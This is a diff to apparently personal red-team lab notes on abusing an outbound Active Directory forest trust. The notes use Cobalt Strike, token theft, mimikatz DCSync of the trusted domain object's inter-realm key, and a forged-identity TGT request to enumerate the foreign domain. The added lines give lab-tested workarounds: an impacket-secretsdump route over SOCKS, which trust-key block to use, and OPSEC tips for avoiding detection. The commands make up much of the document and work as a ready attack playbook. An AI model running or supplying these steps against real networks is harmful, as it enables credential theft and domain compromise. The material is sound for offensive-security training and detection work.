@@ -4,9 +4,9 @@
 
 ===
 
-## Trust Relationship — Understand This First
+## Trust Relationship  
 
-This lab is the **opposite direction** to the Inbound Trusts lab. Read this carefully before any commands.
+This lab is the **opposite direction** to the Inbound Trusts lab  
 
 ```
 ┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐
@@ -25,12 +25,6 @@ This lab is the **opposite direction** to the Inbound Trusts lab. Read this care
          TRUSTING domain                                   TRUSTED domain
    (resources are here — our beacon)                 (accounts originate here)
 ```
-
-**Trust Direction Rule for the exam:**
-- `trustDirection=2 OUTBOUND` (queried from PARTNER) → PARTNER trusts CONTOSO → CONTOSO users can access PARTNER resources. The arrow points AWAY from us toward them.  
-- `trustDirection=1 INBOUND` → they trust us → our users access their resources.  
-- `trustDirection=3` → bidirectional.  
-- `trustAttributes=8` → forest trust → SID filtering ON between forest boundaries.  
 
 **The normal flow** (legitimate):  
 > CONTOSO users authenticate to PARTNER's DC → present credentials → access PARTNER resources. PARTNER users get nothing on CONTOSO (one-way).  
@@ -70,21 +64,7 @@ TDO inter-realm key (DCSync from PARTNER) → authenticate as PARTNER$ to CONTOS
 → TGT for PARTNER$@CONTOSO → LDAP queries against CONTOSO
 ```
 
----
-
 ## Attack Flow Overview
-
-```
-Step 1-2:  Enumerate trust from PARTNER — confirm OUTBOUND, get partner FQDN
-Step 3:    Get TDO object GUID — needed to DCSync a non-user object
-Step 4:    Inject into vwebber (DA on PARTNER) — need replication privs for DCSync
-Step 5:    DCSync TDO object from PARTNER's DC → extract inter-realm RC4 key
-Step 6:    Authenticate as PARTNER$ to CONTOSO's KDC using RC4 key → get TGT
-Step 7:    Inject TGT into sacrificial logon session — isolate it from current context
-Step 8:    Use TGT to enumerate CONTOSO via LDAP → find attack paths
-```
-
-===
 
 1. Launch Cobalt Strike and connect to the team server.
 2. Interact with Beacon and enumerate the trust.
@@ -110,27 +90,54 @@ Step 8:    Use TGT to enumerate CONTOSO via LDAP → find attack paths
     ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
     ```
 
-    > **Why we need the GUID:** DCSync normally replicates user or computer account objects identified by their `sAMAccountName`. The TDO is neither — it is a `trustedDomain` object stored in `CN=System`. To replicate it with DCSync (mimikatz `lsadump::dcsync`), you must identify the object by its `objectGUID` using the `/guid:` flag.
+    > **Why we need the GUID:** DCSync normally replicates user or computer account objects identified by their `sAMAccountName`.  
+    The TDO is a `trustedDomain` object stored in `CN=System`.  
+    To replicate it with DCSync (mimikatz `lsadump::dcsync`), you must identify the object by its `objectGUID` using the `/guid:` flag.
     >
     > The GUID returned `{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}` is PARTNER's TDO object for the CONTOSO trust. Note it — this is `[TDO_GUID]` used in step 5.
 
 4. Inject a Beacon payload into a *vwebber* process.
 
-    > **Why vwebber?** DCSync requires the replication privileges `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.  
-    > These are held by Domain Admins and Domain Controllers — regular users cannot run DCSync.  
-    > `vwebber` is a Domain Admin on PARTNER.  
-    > By injecting into one of vwebber's processes, we steal their security token and run DCSync under their context.  
-    > Use `process_browser` to find a process owned by `vwebber`, then `inject <pid> x64 <listener>` or `steal_token <pid>`.  
-    >
-    > **OPSEC-🟠CAUTION** — Process injection generates telemetry. Prefer `steal_token <pid>` (no new thread injection) over `inject` if the goal is just token impersonation for the DCSync call.  
+>DCSync requires the replication privileges `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.  
+
+```
+process_browser
+steal_token <pid>
+```
+
+> **OPSEC-🟠CAUTION** 
+ Process injection generates telemetry. Prefer `steal_token <pid>` (no new thread injection) over `inject` if the goal is just token impersonation for the DCSync call.
+
+> ⚠️ **Lateral move to par-dc-1 — `jump scshell64` will fail if `defragsvc` is already running (confirmed 2026-04-29):**
+> scshell modifies the service binary path and then calls `StartService`. Error 1056 (`ERROR_SERVICE_ALREADY_RUNNING`) means scshell ran but can't restart the service to execute the payload. Fall back to `jump winrm64 par-dc-1 smb` which has no service dependency.  
 
 5. Use the new Beacon to DCSync the shared inter-realm key from the TDO.
 
-    ```Beacon-nocolor
-    mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
-    ```
+```Beacon-nocolor
+mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
+```
 
-    > **What this does:** OPSEC-🔴UNSAFE Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com` targets PARTNER's DC — this is OUR domain). The `/guid:` flag tells mimikatz to replicate the specific TDO object rather than a user account.
+⚠️ CONFIRMED: CS `dcsync` CANNOT extract TDO objects (tested 2026-04-29)
+
+`dcsync partner.com PARTNER\CONTOSO$` fails with `ERROR kull_m_rpc_drsr_CrackNames: ERROR_NOT_FOUND`  
+**Why:** CS `dcsync` uses `CrackNames` internally to resolve the target account. TDO objects (`trustedDomain` in `CN=System`) have no `sAMAccountName` — `CrackNames` cannot resolve them. Only mimikatz `/guid:` bypasses `CrackNames` and targets the object directly by GUID.
+
+**OPSEC-safer alternative — impacket-secretsdump via SOCKS (🟠CAUTION, no beacon-thread mimikatz):**
+```cs
+// In beacon on par-dc-1:
+socks 1080 socks5
+```
+```bash
+# Kali Docker — set proxychains then extract LSA secrets (includes trust keys):
+nano /etc/proxychains.conf   # socks5 10.0.0.5 1080
+proxychains impacket-secretsdump PARTNER/vwebber:'[PASS]'@par-dc-1.partner.com -just-dc-ntlm
+```
+> impacket-secretsdump uses its own DCSync implementation and supports TDO extraction without needing GUID resolution via CrackNames. Trust keys appear as `$CONTOSO` in the LSA secrets section of the output.
+
+---
+
+OPSEC-🔴UNSAFE (required for CS-only path — no alternative within beacon)
+Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com` targets PARTNER's DC — this is OUR domain). The `/guid:` flag tells mimikatz to replicate the specific TDO object rather than a user account.
     >
     > The TDO object stores the trust password in the same way a machine account stores its password. Mimikatz extracts:
     > - `rc4_hmac_nt` — the RC4 (NT hash) of the trust key → this is `[TRUST KEY]` used in step 6
@@ -139,11 +146,13 @@ Step 8:    Use TGT to enumerate CONTOSO via LDAP → find attack paths
     > Note the `rc4_hmac_nt` value from the output.
     >
     > **OPSEC-🔴UNSAFE** — DCSync generates **Event 4662** on PARTNER's DC. Running DCSync against the TDO (rather than a user account) is unusual and may stand out in logs compared to a normal user account DCSync. Use AES256 if available.
+    >
+    > ⚠️ **`[Out]` vs `[Out-1]` — ALWAYS use `[Out]` (confirmed 2026-04-29):** The TDO output shows two entries — `[Out]` (current key) and `[Out-1]` (previous rotation key). Using `[Out-1]` rc4 hash causes `krb_asktgt` to fail with **Kerberos error 24** (`KDC_ERR_PREAUTH_FAILED`). Always grab hashes from the `[Out]` block only. Prefer `aes256_hmac` over `rc4_hmac_nt`.
 
 6. Request a TGT for the trust account using the shared secret.
 
     ```Beacon-nocolor
-    krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
+    krb_asktgt /user:PARTNER$ /aes256:[TRUST KEY AES256 from [Out]] /domain:contoso.com /dc:lon-dc-1.contoso.com
     ```
 
     > **What this does:** Sends an AS-REQ (Kerberos authentication request) to **CONTOSO's KDC** (`/dc:lon-dc-1.contoso.com` — note this is the FOREIGN domain's DC, not ours) requesting a TGT for the account `PARTNER$` in `contoso.com`.
@@ -244,38 +253,3 @@ ldapsearch (objectClass=trustedDomain) --hostname contoso.com --dn DC=contoso,DC
 ```
 
 > CONTOSO may have its own trusts to additional domains — this extends your enumeration further. A trust chain (PARTNER → CONTOSO → THIRD_DOMAIN) could be exploited step by step.
-
-===
-
-## Comparison — Inbound vs Outbound Trust Abuse
-
-| Property | Inbound (prev lab) | Outbound (this lab) |
-|----------|--------------------|---------------------|
-| trustDirection (our view) | 1 — INBOUND | 2 — OUTBOUND |
-| We are the... | Trusted domain | Trusting domain |
-| Legitimate flow | Our users → their resources | Their users → our resources |
-| Attack goal | Access foreign resources | Enumerate foreign domain |
-| Credential needed | Member account's hash (rsteel) | TDO inter-realm key (PARTNER$) |
-| Key source | DCSync target user | DCSync TDO object via GUID |
-| Ticket chain | TGT → inter-realm → service ticket | TGT only (for LDAP enum) |
-| Result | Local admin on foreign machine | Authenticated LDAP read on foreign domain |
-| Noisiest step | DCSync (Event 4662 on our DC) | DCSync TDO + AS-REQ to foreign DC |
-
-## Quick Reference — Exam Day
-
-```
-OUTBOUND trust abuse — the 5-step summary:
-
-1. ldapsearch trustedDomain → confirm trustDirection=2, note partner FQDN
-2. ldapsearch trustedDomain (name,objectGUID) → note TDO GUID
-3. steal_token <DA_pid>
-4. mimikatz dcsync /domain:OUR.DOMAIN /guid:{TDO_GUID} → note rc4_hmac_nt
-5. krb_asktgt /user:OURDOMAIN$ /rc4:[KEY] /domain:FOREIGN.DOMAIN /dc:foreign-dc-fqdn
-   → inject TGT into sacrificial session
-   → ldapsearch against foreign domain for Kerberoastable / AS-REP / DA accounts
-
-Key objects:
-  TDO       = trustedDomain object in CN=System — stores inter-realm key
-  PARTNER$  = trust account CONTOSO created for this trust — same key as TDO
-  RC4 key   = NT hash of trust password — extracted from TDO via DCSync
-```
